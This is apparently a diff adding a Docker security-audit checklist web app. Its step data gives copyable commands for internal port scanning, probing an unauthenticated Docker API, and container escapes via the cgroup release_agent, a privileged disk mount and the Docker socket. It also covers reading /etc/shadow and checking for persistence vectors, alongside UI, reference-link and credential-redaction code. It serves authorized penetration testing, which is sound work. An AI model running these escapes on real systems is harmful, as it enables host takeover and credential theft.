+{id:24, root:"low",
+title:"Map network interfaces and routes",
+why:"The network configuration reveals the container's isolation level and what other services are reachable. Multiple interfaces indicate the container bridges multiple segments. The ARP table passively reveals other live hosts without any active scanning.",
+look:"Look for: Host IP on eth0 = --network=host. Multiple interfaces = additional segments reachable. ARP table shows other live hosts.",
+cmds:[
+  {c:"ip a 2>/dev/null || ifconfig 2>/dev/null"},
+  {c:"ip route 2>/dev/null || route -n 2>/dev/null"},
+  {c:"cat /etc/hosts"},
+  {c:"cat /etc/resolv.conf"},
+  {c:"cat /proc/net/arp 2>/dev/null"}
+]},
+
+{id:25, root:"low",
+title:"Scan localhost and gateway for open ports",
+why:"Docker services — the daemon API, registries, dashboards — often listen on the host or gateway and are assumed inaccessible from inside containers. The bash /dev/tcp technique works in any shell without nmap or netcat.",
+look:"Look for: 2375 = unauthenticated Docker API. 2376 = Docker API (TLS). 5000 = Docker registry. 9000 = Portainer.",
+cmds:[
+  {c:"for p in 22 80 443 2375 2376 3306 5000 5432 6379 8080 8443 9000 9090 27017; do (echo >/dev/tcp/127.0.0.1/$p) 2>/dev/null && echo \"[+] localhost:$p\"; done"},
+  {c:"GW=$(ip route | grep default | awk '{print $3}'); for p in 22 80 2375 2376 5000 8080 8443 9000; do (echo >/dev/tcp/$GW/$p) 2>/dev/null && echo \"[+] $GW:$p\"; done"},
+  {c:"ss -tulnp 2>/dev/null || netstat -tulnp 2>/dev/null"}
+]},
+
+{id:26, root:"low",
+title:"Discover other containers on the bridge network",
+why:"By default Docker places containers on a bridge network (172.17.0.0/16) where they can communicate directly. Other containers may have weaker security postures, exposed services, or accessible credentials.",
+look:"Look for: Live hosts on 172.17.0.x = other containers on the same Docker bridge = lateral movement targets.",
+cmds:[
+  {c:"for i in $(seq 1 20); do (ping -c1 -W1 172.17.0.$i &>/dev/null && echo \"[+] 172.17.0.$i up\") & done; wait"},
+  {c:"for i in $(seq 1 20); do (echo >/dev/tcp/172.17.0.$i/80) 2>/dev/null && echo \"[+] 172.17.0.$i:80\" & done; wait 2>/dev/null"},
+  {c:"cat /proc/net/arp"}
+]},
+
+{id:27, root:"low",
+title:"Test unauthenticated Docker API on port 2375",
+why:"The Docker daemon can be configured to listen on TCP without TLS or authentication. A common misconfiguration in development environments that grants full daemon control — equivalent to unauthenticated root on the host.",
+look:"Look for: JSON response without credentials = full daemon access = host root equivalent. Enumerate containers, inspect env vars, spawn privileged containers.",
+cmds:[
+  {comment:"Precondition: port 2375 open on gateway in step 25"},
+  {c:"GW=$(ip route | grep default | awk '{print $3}')"},
+  {c:"curl -s http://$GW:2375/version 2>/dev/null && echo '[+] Unauthenticated Docker API confirmed'"},
+  {c:"curl -s http://$GW:2375/containers/json 2>/dev/null | python3 -m json.tool 2>/dev/null | grep -E 'Names|Image|Status' | head -20"},
+  {c:"curl -s http://$GW:2375/containers/<ID>/json 2>/dev/null | python3 -m json.tool 2>/dev/null | grep -A2 'Env'"}
+]},
+
+{section:"Escape Attempts"},
+
+{id:28, root:"root",
+title:"E1 — cgroup release_agent escape",
+why:"The Linux kernel executes the cgroup release_agent as root on the host when a cgroup becomes empty. With SYS_ADMIN or --privileged a container can mount cgroup filesystems and write to the release_agent file. Requires root inside the container to perform the mount syscall.",
+look:"Precondition: SYS_ADMIN or --privileged (steps 1/2) + writable cgroup (step 14). /tmp/escape containing uid=0 from the host = full escape confirmed.",
+cmds:[
+  {comment:"Precondition: SYS_ADMIN or --privileged confirmed in steps 1 and 2"},
+  {c:"mkdir /tmp/cgrp 2>/dev/null && mount -t cgroup -o memory cgroup /tmp/cgrp 2>/dev/null && mkdir /tmp/cgrp/x"},
+  {c:"echo 1 > /tmp/cgrp/x/notify_on_release"},
+  {c:"host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /proc/mounts | head -1); echo \"${host_path}/cmd\" > /tmp/cgrp/release_agent"},
+  {c:"echo '#!/bin/sh' > /cmd && echo 'id > /tmp/escape' >> /cmd && chmod +x /cmd"},
+  {c:"sh -c 'echo $$ > /tmp/cgrp/x/cgroup.procs'; sleep 1; cat /tmp/escape 2>/dev/null"}
+]},
+
+{id:29, root:"root",
+title:"E2 — privileged disk mount escape",
+why:"With --privileged the container can see and mount all host block devices. Mounting the host root partition and chrooting provides a fully interactive root shell on the host filesystem. The mount syscall requires root inside the container.",
+look:"Precondition: --privileged confirmed in step 2. Mount succeeds + /etc/shadow readable = full host filesystem r/w. chroot = interactive root shell.",
+cmds:[
+  {comment:"Precondition: --privileged confirmed in step 2"},
+  {c:"fdisk -l 2>/dev/null | grep -E 'Linux|Device'"},
+  {c:"blkid 2>/dev/null"},
+  {c:"mkdir -p /mnt/host"},
+  {c:"mount /dev/sda1 /mnt/host 2>/dev/null || mount /dev/nvme0n1p1 /mnt/host 2>/dev/null || mount /dev/xvda1 /mnt/host 2>/dev/null"},
+  {c:"cat /mnt/host/etc/shadow 2>/dev/null | head -5"},
+  {c:"chroot /mnt/host /bin/bash 2>/dev/null"}
+]},
+
+{id:30, root:"low",
+title:"E3 — Docker socket escape",
+why:"A writable Docker socket gives full programmatic control of the Docker daemon via its REST API. Using only curl a new privileged container can be spawned with the host root filesystem bind-mounted. No docker binary or root access inside the container required.",
+look:"Precondition: Writable socket confirmed in step 12. Shadow output = full host filesystem access. No docker binary required — curl is enough.",
+cmds:[
+  {comment:"Precondition: writable /var/run/docker.sock confirmed in step 12"},
+  {c:"ID=$(curl -s --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' -d '{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\",\"-c\",\"cat /host/etc/shadow\"],\"Binds\":[\"/:/host\"],\"Privileged\":true}' http://localhost/containers/create 2>/dev/null | python3 -c 'import sys,json; print(json.load(sys.stdin)[\"Id\"])' 2>/dev/null)"},
+  {c:"curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/$ID/start 2>/dev/null"},
+  {c:"curl -s --unix-socket /var/run/docker.sock http://localhost/containers/$ID/logs?stdout=1 2>/dev/null"}
+]},
+
+{id:31, root:"low",
+title:"E4 — CVE-2022-0492 unprivileged cgroup escape",
+why:"CVE-2022-0492 allows an unprivileged user to abuse user namespaces and cgroup v1 to write to the release_agent without SYS_ADMIN on kernels before 5.17. No capabilities needed if seccomp and AppArmor are absent.",
+look:"Precondition: kernel < 5.17 + Seccomp: 0 (step 5). unshare succeeds with full caps in new namespace = exploit conditions met.",
+cmds:[
+  {comment:"Precondition: kernel < 5.17 and Seccomp: 0 confirmed in step 5"},
+  {c:"uname -r"},
+  {c:"cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null"},
+  {c:"cat /proc/sys/user/max_user_namespaces 2>/dev/null"},
+  {c:"unshare -UrmC --propagation=unchanged /bin/sh -c 'id; grep CapEff /proc/self/status' 2>/dev/null"}
+]},
+
+{section:"Post-Escape"},
+
+{id:32, root:"low",
+title:"Document host identity",
+why:"Once a container escape is confirmed, documenting the host identity establishes the true scope and blast radius. These commands use standard utilities available to any user — no root required. You are already on the host at this point.",
+look:"Record: hostname, all IPs, OS version, kernel version. Defines the actual blast radius of the escape.",
+cmds:[
+  {c:"uname -a"},
+  {c:"hostname && ip a"},
+  {c:"cat /etc/os-release 2>/dev/null"},
+  {c:"df -h"}
+]},
+
+{id:33, root:"low",
+title:"Check persistence vectors on host",
+why:"After escaping to the host, documenting available persistence vectors demonstrates full impact to the client. Most of these checks are directory listings and file reads that do not require root — you are checking what is accessible to the user you landed as after the escape.",
+look:"Look for: Writable authorized_keys = SSH backdoor. Writable cron = scheduled exec as root. Writable sudoers = permanent privilege.",
+cmds:[
+  {c:"ls -la /root/.ssh/ 2>/dev/null"},
+  {c:"ls -la /etc/cron* /var/spool/cron/ 2>/dev/null"},
+  {c:"cat /etc/sudoers 2>/dev/null | grep -vE '^#|^$'"},
+  {c:"ls /etc/systemd/system/*.service 2>/dev/null | head -10"}
+]},
+
+{id:34, root:"low",
+title:"Enumerate all other running containers",
+why:"From the host the full container inventory is visible via the Docker socket. Docker group membership is sufficient — root is not required. Any user in the docker group can enumerate all containers, inspect their environment variables, and pull their image details via the socket API.",
+look:"Look for: Each running container = lateral movement target. Inspect env vars for credentials. Older image tags = more CVE exposure.",
+cmds:[
+  {c:"docker ps -a 2>/dev/null"},
+  {c:"curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json 2>/dev/null | python3 -m json.tool 2>/dev/null | grep -E 'Names|Image|Status' | head -30"},
+  {c:"curl -s --unix-socket /var/run/docker.sock http://localhost/images/json 2>/dev/null | python3 -m json.tool 2>/dev/null | grep -E 'RepoTags|Size' | head -20"}
+]},
+
+{section:"Additional Checks"},
+
+];
+
+// ── Custom checks state ────────────────────────────────
+let customChecks = [];
+
+function addCustomCheck() {
+  customChecks.push({title:'', note:'', done:false});
+  save(); renderCustomChecks();
+}
+
+function removeCustomCheck(idx) {
+  customChecks.splice(idx, 1);
+  save(); renderCustomChecks();
+}
+
+function customTitleChange(idx) {
+  customChecks[idx].title = document.getElementById('ctitle-' + idx).value;
+  save();
+}
+
+function customNoteChange(idx) {
+  customChecks[idx].note = document.getElementById('cnote-' + idx).value;
+  save();
+}
+
+function tickCustom(idx) {
+  customChecks[idx].done = !customChecks[idx].done;
+  document.getElementById('crow-' + idx).classList.toggle('done', customChecks[idx].done);
+  document.getElementById('ccbm-' + idx).classList.toggle('on', customChecks[idx].done);
+  save();
+}
+
+function renderCustomChecks() {
+  const el = document.getElementById('custom-checks');
+  if (!el) return;
+  let html = '';
+  customChecks.forEach((cc, idx) => {
+    const safeTitle = cc.title.replace(/"/g,'&quot;');
+    const safeNote  = cc.note.replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    html += `<div class="step${cc.done?' done':''}" id="crow-${idx}" style="flex-direction:column;align-items:stretch;gap:6px;padding:10px 0">
+      <div style="display:flex;gap:10px;align-items:flex-start">
+        <div class="step-cb${cc.done?' on':''}" id="ccbm-${idx}" onclick="tickCustom(${idx})" style="margin-top:6px;flex-shrink:0"></div>
+        <input type="text" id="ctitle-${idx}" value="${safeTitle}" placeholder="Check title..."
+          style="flex:1;font-size:13px;font-weight:500;font-family:var(--sans);background:transparent;border:none;border-bottom:0.5px solid var(--border2);padding:4px 0;color:var(--text);outline:none"
+          oninput="customTitleChange(${idx})">
+        <button onclick="removeCustomCheck(${idx})"
+          style="font-size:10px;padding:3px 8px;border-radius:5px;border:0.5px solid var(--border2);background:transparent;color:var(--text3);cursor:pointer;font-family:var(--sans);flex-shrink:0">Remove</button>
+      </div>
+      <div style="padding-left:26px">
+        <div class="out-label" style="margin-bottom:4px;display:flex;align-items:center;justify-content:space-between">Notes / Output<button class="cpbtn" onclick="manualRedactCustom(${idx})" title="Redact selected text">Redact selection</button></div>
+        <textarea class="output-field" id="cnote-${idx}" placeholder="Describe the check, commands used, and findings..." oninput="customNoteChange(${idx})">${safeNote}</textarea>
+      </div>
+    </div>`;
+  });
+  html += `<div style="padding:10px 0 4px">
+    <button onclick="addCustomCheck()" style="font-size:12px;padding:6px 14px;border-radius:7px;border:0.5px solid var(--border2);background:transparent;color:var(--text2);cursor:pointer;font-family:var(--sans)">+ Add check</button>
+  </div>`;
+  el.innerHTML = html;
+}
+
+const REFS = [
+  { cat:"Methodology & Checklists", items:[
+    {title:"OWASP Docker Security Cheat Sheet",url:"https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html",desc:"Authoritative hardening rules covering capabilities, seccomp, resource limits, read-only filesystems, and supply chain security."},
+    {title:"HackTricks — 2375/2376 Pentesting Docker",url:"https://hacktricks.wiki/en/network-services-pentesting/2375-pentesting-docker.html",desc:"Practical enumeration and exploitation guide for exposed Docker API endpoints, container inspection, and privilege escalation."},
+    {title:"Intrusionz3r0 — Containers Pentesting",url:"https://intrusionz3r0.gitbook.io/intrusionz3r0/containers-pentesting",desc:"Walkthrough of Docker architecture, socket abuse, group privilege escalation, and Docker exec exploitation."},
+    {title:"RedFox Security — Docker Escape Techniques",url:"https://academy.redfoxsec.com/blog/docker-escape-techniques-practical-guide",desc:"Practical guide covering common Docker escape paths with step-by-step exploitation examples."},
+  ]},
+  { cat:"Escape Techniques", items:[
+    {title:"Trail of Bits — Understanding Docker Container Escapes",url:"https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/",desc:"Original research on the cgroup release_agent escape technique (E1) using SYS_ADMIN. The definitive reference for this attack class."},
+    {title:"CVE-2022-0492 — Unprivileged Cgroup Escape",url:"https://unit42.paloaltonetworks.com/cve-2022-0492-cgroup/",desc:"Analysis of the unprivileged cgroup v1 release_agent escape affecting kernels before 5.17. Exploitable without SYS_ADMIN when seccomp is absent."},
+    {title:"CVE-2022-0847 — Dirty Pipe",url:"https://dirtypipe.cm4all.com/",desc:"Kernel write-to-read-only-files vulnerability affecting Linux 5.8–5.16.11. Executable from within a container to overwrite host binaries."},
+    {title:"CVE-2019-5736 — runc Container Breakout",url:"https://unit42.paloaltonetworks.com/breaking-docker-via-runc/",desc:"runc binary overwrite vulnerability allowing a malicious container image to escape to the host. Check runc version if running older Docker."},
+    {title:"Escaping Docker Privileged Containers",url:"https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1",desc:"Walkthrough of disk mount and cgroup escapes from --privileged containers with practical command examples."},
+  ]},
+  { cat:"Tools", items:[
+    {title:"LinPEAS",url:"https://github.com/peass-ng/PEASS-ng",desc:"Automated Linux privilege escalation and container escape enumeration script."},
+    {title:"DEEPCE",url:"https://github.com/stealthcopter/deepce",desc:"Focused container escape enumeration — socket, capabilities, mounts, and escape PoC checks."},
+    {title:"CDK — Container Duck Knife",url:"https://github.com/cdk-team/CDK",desc:"Auto-evaluates all exploit preconditions including capabilities, mounts, and network vectors."},
+    {title:"pspy",url:"https://github.com/DominicBreuker/pspy",desc:"Unprivileged process monitor revealing cronjobs and commands run by other users."},
+    {title:"GTFObins",url:"https://gtfobins.github.io/",desc:"Reference for SUID binary abuse, sudo misconfigurations, and capability exploitation paths."},
+    {title:"Lynis",url:"https://github.com/CISOfy/lynis",desc:"Host security auditing tool — 300+ checks covering kernel hardening, authentication, file permissions, and installed software."},
+  ]},
+  { cat:"Kernel & Capability References", items:[
+    {title:"Linux Capabilities man page",url:"https://man7.org/linux/man-pages/man7/capabilities.7.html",desc:"Authoritative reference for all Linux capability flags. Essential for manually decoding CapEff hex values."},
+    {title:"Linux Namespaces man page",url:"https://man7.org/linux/man-pages/man7/namespaces.7.html",desc:"Reference documentation for PID, network, IPC, UTS, user, and mount namespaces used by Docker."},
+    {title:"Docker Security Documentation",url:"https://docs.docker.com/engine/security/",desc:"Official Docker security docs covering the daemon attack surface, namespaces, capabilities, seccomp, and AppArmor profiles."},
+  ]},
+];
+
+// ── State ──────────────────────────────────────────────
+const TOTAL_STEPS = DATA.filter(s => s.id).length;
+const TOTAL_TOOLS = TOOLS_DATA.filter(t => t.tid).length;
+let state = {};    // {id/tid: bool}  step/tool checked
+let cmdState = {}; // {'id_idx': bool} per-command checked
+let notes = {};    // {'id_low','id_root','id','tid_low','tid_root','tid'}: string
+
+// ── Persistence ────────────────────────────────────────
+function save() {
+  try { localStorage.setItem('dac1', JSON.stringify({state, cmdState, notes, customChecks})); } catch(e) {}
+}
+function load() {
+  try {
+    const raw = localStorage.getItem('dac1');
+    if (raw) { const d = JSON.parse(raw); state = d.state||{}; cmdState = d.cmdState||{}; notes = d.notes||{}; customChecks = d.customChecks||[]; }
+  } catch(e) {}
+}
+
+// ── Command store ──────────────────────────────────────
+const CMD_STORE = {};
+[...DATA, ...TOOLS_DATA].forEach(s => {
+  const key = s.id !== undefined ? s.id : s.tid;
+  if (!key) return;
+  (s.cmds||[]).forEach((item, idx) => {
+    if (item.c) CMD_STORE[key + '_' + idx] = item.c;
+  });
+});
+
+// ── UI helpers ─────────────────────────────────────────
+// Get all command indices for a step/tool key
+function getCmdIndices(key) {
+  const all = [...DATA, ...TOOLS_DATA];
+  const s = all.find(x => (x.id !== undefined ? x.id : x.tid) == key);
+  if (!s || !s.cmds) return [];
+  return s.cmds.map((item, idx) => ({item, idx})).filter(({item}) => item.c).map(({idx}) => idx);
+}
+
+function setStepChecked(key, val) {
+  state[key] = val;
+  const row = document.getElementById('row-' + key);
+  const cb  = document.getElementById('scb-' + key);
+  if (row) row.classList.toggle('done', val);
+  if (cb)  cb.classList.toggle('on', val);
+}
+
+function setCmdChecked(key, idx, val) {
+  const ckey = key + '_' + idx;
+  cmdState[ckey] = val;
+  const cb   = document.getElementById('ccb-' + ckey);
+  const code = document.getElementById('ccode-' + ckey);
+  if (cb)   cb.classList.toggle('on', val);
+  if (code) code.classList.toggle('cmd-done', val);
+}
+
+function tickStep(key) {
+  const newVal = !state[key];
+  setStepChecked(key, newVal);
+  // Cascade to all sub-command checkboxes
+  getCmdIndices(key).forEach(idx => setCmdChecked(key, idx, newVal));
+  updateBar(); save();
+}
+
+function tickCmd(key, idx) {
+  const ckey = key + '_' + idx;
+  const newVal = !cmdState[ckey];
+  setCmdChecked(key, idx, newVal);
+  // Check if all commands for this step are now checked → auto-check step
+  const allIndices = getCmdIndices(key);
+  if (allIndices.length > 0) {
+    const allDone = allIndices.every(i => !!cmdState[key + '_' + i]);
+    if (allDone && !state[key]) setStepChecked(key, true);
+    // If unchecking one → uncheck the step main checkbox
+    if (!newVal && state[key]) setStepChecked(key, false);
+  }
+  updateBar(); save();
+}
+
+function noteChange(nkey) {
+  notes[nkey] = document.getElementById('note-' + nkey).value;
+  save();
+}
+
+function updateBar() {
+  const doneSteps = DATA.filter(s => s.id && state[s.id]).length;
+  const doneTools = TOOLS_DATA.filter(t => t.tid && state[t.tid]).length;
+  const total = TOTAL_STEPS + TOTAL_TOOLS;
+  const done = doneSteps + doneTools;
+  document.getElementById('pf').style.width = Math.round(done / total * 100) + '%';
+  document.getElementById('pl').textContent = done + ' / ' + total + ' complete (' + doneTools + ' tools, ' + doneSteps + ' checks)';
+}
+
+function cpCmd(btn) {
+  const text = CMD_STORE[btn.dataset.ckey] || '';
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'Copied'; btn.classList.add('ok');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('ok'); }, 1400);
+  }).catch(() => { btn.textContent = 'Error'; });
+}
+
+function resetAll() {
+  if (!confirm('Reset all checkboxes, command checkboxes, output notes, and additional checks?')) return;
+  state = {}; cmdState = {}; notes = {}; customChecks = [];
+  document.querySelectorAll('.step').forEach(el => el.classList.remove('done'));
+  document.querySelectorAll('.step-cb').forEach(el => el.classList.remove('on'));
+  document.querySelectorAll('.cmd-cb').forEach(el => el.classList.remove('on'));
+  document.querySelectorAll('.code').forEach(el => el.classList.remove('cmd-done'));
+  document.querySelectorAll('.output-field').forEach(el => { el.value = ''; });
+  updateBar(); save(); renderCustomChecks();
+}
+
+// ── Build step HTML ────────────────────────────────────
+function buildStep(s, n, isToolStep) {
+  const key = s.id !== undefined ? s.id : s.tid;
+  const done = !!state[key];
+  const rootMode = s.root || 'low';
+
+  // Output fields: both = two fields, root = one root field, low = one low field
+  let outHtml = '<div class="out-wrap">';
+  if (rootMode === 'both') {
+    const nkL = key + '_low', nkR = key + '_root';
+    const vL = (notes[nkL]||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+    const vR = (notes[nkR]||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+    outHtml += `<div class="out-block"><div class="out-label" style="display:flex;align-items:center;justify-content:space-between">Output <span class="low-badge">Low-priv</span><button class="cpbtn" onclick="manualRedact('${nkL}')" title="Redact selected text">Redact selection</button></div><textarea class="output-field" id="note-${nkL}" placeholder="Paste output from low-privileged user..." oninput="noteChange('${nkL}')">${vL}</textarea></div>`;
+    outHtml += `<div class="out-block"><div class="out-label" style="display:flex;align-items:center;justify-content:space-between">Output <span class="root-badge">Root</span><button class="cpbtn" onclick="manualRedact('${nkR}')" title="Redact selected text">Redact selection</button></div><textarea class="output-field" id="note-${nkR}" placeholder="Paste output from root..." oninput="noteChange('${nkR}')">${vR}</textarea></div>`;
+  } else if (rootMode === 'root') {
+    const nk = key + '_root';
+    const v = (notes[nk]||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+    outHtml += `<div class="out-block"><div class="out-label" style="display:flex;align-items:center;justify-content:space-between">Output <span class="root-badge">Root</span><button class="cpbtn" onclick="manualRedact('${nk}')" title="Redact selected text">Redact selection</button></div><textarea class="output-field" id="note-${nk}" placeholder="Paste output from root..." oninput="noteChange('${nk}')">${v}</textarea></div>`;
+  } else {
+    const nk = key + '_low';
+    const v = (notes[nk]||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+    outHtml += `<div class="out-block"><div class="out-label" style="display:flex;align-items:center;justify-content:space-between">Output <span class="low-badge">Low-priv</span><button class="cpbtn" onclick="manualRedact('${nk}')" title="Redact selected text">Redact selection</button></div><textarea class="output-field" id="note-${nk}" placeholder="Paste output here..." oninput="noteChange('${nk}')">${v}</textarea></div>`;
+  }
+  outHtml += '</div>';
+
+  // Root badge in title
+  const rootBadge = rootMode === 'root' ? '<span class="root-badge">Root required</span>'
+                  : rootMode === 'both' ? '<span class="root-badge">Run as both</span>'
+                  : '';
+
+  // Commands
+  let cmdsHtml = '<div class="cmds">';
+  (s.cmds||[]).forEach((item, idx) => {
+    if (item.comment) {
+      cmdsHtml += `<div class="cmt"># ${item.comment}</div>`;
+    } else {
+      const ckey = key + '_' + idx;
+      const cdone = !!cmdState[ckey];
+      const esc = item.c.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+      cmdsHtml += `<div class="cmd-row">
+        <div class="cmd-cb${cdone?' on':''}" id="ccb-${ckey}" onclick="tickCmd('${key}',${idx})" title="Mark command as run"></div>
+        <code class="code${cdone?' cmd-done':''}" id="ccode-${ckey}">${esc}</code>
+        <button class="cpbtn" data-ckey="${ckey}" onclick="cpCmd(this)">Copy</button>
+      </div>`;
+    }
+  });
+  cmdsHtml += '</div>';
+
+  const numLabel = isToolStep ? '' : `<span class="num">${String(n).padStart(2,'0')}</span>`;
+  const whyHtml = s.why ? `<div class="why-text">${s.why}</div>` : '';
+  const lookHtml = s.look ? `<div class="look">${s.look}</div>` : '';
+
+  return `<div class="step${done?' done':''}" id="row-${key}">
+<div class="step-cb${done?' on':''}" id="scb-${key}" onclick="tickStep('${key}')"></div>
+${numLabel}
+<div class="body">
+<div class="stitle" onclick="tickStep('${key}')">${s.title}${rootBadge}</div>
+${whyHtml}${lookHtml}
+${cmdsHtml}
+${outHtml}
+</div></div>`;
+}
+
+// ── Render ─────────────────────────────────────────────
+function render() {
+  const el = document.getElementById('list');
+  let html = '';
+
+  // Tools section
+  html += '<div class="section-hdr">Tools</div>';
+  TOOLS_DATA.forEach(t => {
+    if (t.section) return; // skip the section marker, we already added header
+    html += buildStep(t, 0, true);
+  });
+
+  // Check sections
+  let n = 0;
+  DATA.forEach(s => {
+    if (s.section) {
+      html += `<div class="section-hdr">${s.section}</div>`;
+      if (s.section === 'Additional Checks') {
+        html += `<div id="custom-checks"></div>`;
+      }
+      return;
+    }
+    n++;
+    html += buildStep(s, n, false);
+  });
+
+  el.innerHTML = html;
+}
+
+// ── Render refs ────────────────────────────────────────
+function renderRefs() {
+  const el = document.getElementById('refs-list');
+  let html = '';
+  REFS.forEach(cat => {
+    html += `<div style="margin-bottom:14px">`;
+    html += `<div style="font-size:11px;font-weight:500;color:var(--text2);margin-bottom:6px">${cat.cat}</div>`;
+    html += `<div style="display:flex;flex-direction:column;gap:4px">`;
+    cat.items.forEach(ref => {
+      html += `<div style="display:flex;gap:8px;align-items:baseline;flex-wrap:wrap">`;
+      html += `<a href="${ref.url}" target="_blank" style="font-size:12px;color:var(--green);text-decoration:none;white-space:nowrap;flex-shrink:0">${ref.title}</a>`;
+      html += `<span style="font-size:11px;color:var(--text3)">— ${ref.desc}</span>`;
+      html += `</div>`;
+    });
+    html += `</div></div>`;
+  });
+  el.innerHTML = html;
+}
+
+// ── Credential redaction ───────────────────────────────
+let redactEnabled = true;
+
+function toggleRedact() {
+  redactEnabled = !redactEnabled;
+  const track = document.getElementById('redact-track');
+  const thumb = document.getElementById('redact-thumb');
+  track.style.background = redactEnabled ? 'var(--green)' : 'var(--border2)';
+  thumb.style.left = redactEnabled ? '14px' : '2px';
+}
+
+function snip(val) {
+  if (!val || val.length <= 8) return '<--- REDACTED --->';
+  return val.slice(0,3) + '<--- REDACTED --->' + val.slice(-3);
+}
+
+function redactOutput(text) {
+  if (!redactEnabled || !text || text === '(no output recorded)') return text;
+
+  // ── Pass 1: multi-line block redaction ──────────────
+  // Certificates, private keys, SSH keys — keep first 3 and last 3 lines, snip middle
+  text = text.replace(
+    /(-----BEGIN [\w\s]+(KEY|CERTIFICATE|DSA|EC|RSA|OPENSSH PRIVATE KEY)-----\n)([\s\S]+?)(-----END [\w\s]+(KEY|CERTIFICATE|DSA|EC|RSA|OPENSSH PRIVATE KEY)-----)/g,
+    (_, beginLine, _t1, body, endLine) => {
+      const bodyLines = body.split('\n').filter(l => l.trim() !== '');
+      if (bodyLines.length <= 6) {
+        return beginLine + bodyLines.map(() => '<--- REDACTED --->').join('\n') + '\n' + endLine;
+      }
+      const kept = [
+        ...bodyLines.slice(0, 3),
+        '<--- REDACTED --->',
+        ...bodyLines.slice(-3),
+      ];
+      return beginLine + kept.join('\n') + '\n' + endLine;
+    }
+  );
+
+  // ── Pass 2: line-by-line redaction ──────────────────
+  const lines = text.split('\n');
+  const out = lines.map(line => {
+
+    // Skip comment lines and already-redacted lines
+    if (/^\s*#/.test(line)) return line;
+    if (line.includes('<--- REDACTED --->')) return line;
+
+    // ENV-style: KEY=value — only when key name suggests credential
+    line = line.replace(
+      /\b((?:password|passwd|secret|token|api[_\-]?key|access[_\-]?key|private[_\-]?key|auth[_\-]?token|bearer|jwt|credential|api[_\-]?secret|client[_\-]?secret|signing[_\-]?key|encryption[_\-]?key|db[_\-]?pass(?:word)?|database[_\-]?pass(?:word)?|redis[_\-]?pass(?:word)?|mongo[_\-]?pass(?:word)?|mysql[_\-]?pass(?:word)?|mariadb[_\-]?pass(?:word)?|pgpassword|postgres[_\-]?pass(?:word)?|github[_\-]?token|gh[_\-]?token|gcp[_\-]?key|azure[_\-]?secret|aws[_\-]?secret|aws[_\-]?access)[_\-]?\w*)\s*[=:]\s*['"]?([^\s'"]{3,})['"]?/gi,
+      (_, key, val) => `${key}=${snip(val)}`
+    );
+
+    // JSON-style: "password": "value"
+    line = line.replace(
+      /"(password|passwd|secret|token|apikey|api_key|access_key|private_key|auth|bearer|credential|client_secret)"\s*:\s*"([^"]{3,})"/gi,
+      (_, key, val) => `"${key}": "${snip(val)}"`
+    );
+
+    // AWS Access Key ID: AKIA[A-Z0-9]{16}
+    line = line.replace(
+      /\b(AKIA[A-Z0-9]{16})\b/g,
+      val => snip(val)
+    );
+
+    // AWS Secret Access Key: only after explicit key name
+    line = line.replace(
+      /(aws_secret_access_key\s*[=:]\s*)([A-Za-z0-9+/]{30,})/gi,
+      (_, prefix, val) => `${prefix}${snip(val)}`
+    );
+
+    // Docker config.json base64 auth blobs — only on lines with auth/Authorization/Bearer context
+    if (/\b(?:auth|Authorization|Bearer)\b/i.test(line)) {
+      line = line.replace(
+        /([A-Za-z0-9+/]{30,}={0,2})/g,
+        val => snip(val)
+      );
+    }
+
+    // JWT tokens: three base64url segments separated by dots
+    line = line.replace(
+      /\b(eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)\b/g,
+      val => snip(val)
+    );
+
+    return line;
+  });
+  return out.join('\n');
+}
+
+// ── Manual redaction ───────────────────────────────────
+function manualRedact(noteKey) {
+  const el = document.getElementById('note-' + noteKey);
+  if (!el) return;
+  const start = el.selectionStart;
+  const end   = el.selectionEnd;
+  if (start === end) {
+    alert('Select the text you want to redact first, then click Redact Selection.');
+    return;
+  }
+  const selected = el.value.substring(start, end);
+  const replacement = snip(selected);
+  el.value = el.value.substring(0, start) + replacement + el.value.substring(end);
+  notes[noteKey] = el.value;
+  save();
+}
+
+function manualRedactCustom(idx) {
+  const el = document.getElementById('cnote-' + idx);
+  if (!el) return;
+  const start = el.selectionStart;
+  const end   = el.selectionEnd;
+  if (start === end) {
+    alert('Select the text you want to redact first, then click Redact Selection.');
+    return;
+  }
+  const selected = el.value.substring(start, end);
+  el.value = el.value.substring(0, start) + snip(selected) + el.value.substring(end);
+  customChecks[idx].note = el.value;
+  save();
+}
+
+// Helper: apply redaction to a note value for export
+function exportNote(raw) {
+  const text = (raw || '').trim() || '(no output recorded)';
+  return redactEnabled ? redactOutput(text) : text;
+}
+
+// ── Markdown export ────────────────────────────────────
+function exportMd() {
+  const now = new Date();
+  const ts = now.toISOString().replace('T',' ').substring(0,16);
+  let md = `# Docker Audit Checklist — Report\n\n`;
+  md += `**Date:** ${ts}\n\n`;
+  const totalItems = DATA.filter(s=>s.id).length + TOOLS_DATA.filter(t=>t.tid).length;
+  const doneItems = [...DATA,...TOOLS_DATA].filter(s=>(s.id||s.tid)&&state[s.id||s.tid]).length;
+  md += `**Progress:** ${doneItems} / ${totalItems} complete\n\n`;
+  md += `**Credential redaction:** ${redactEnabled ? 'Enabled — sensitive values have been snipped' : 'Disabled — output exported as-is'}\n\n---\n\n`;
+
+  // Tools section
+  md += `## Tools\n\n`;
+  md += `| Tool | Description | URL |\n|---|---|---|\n`;
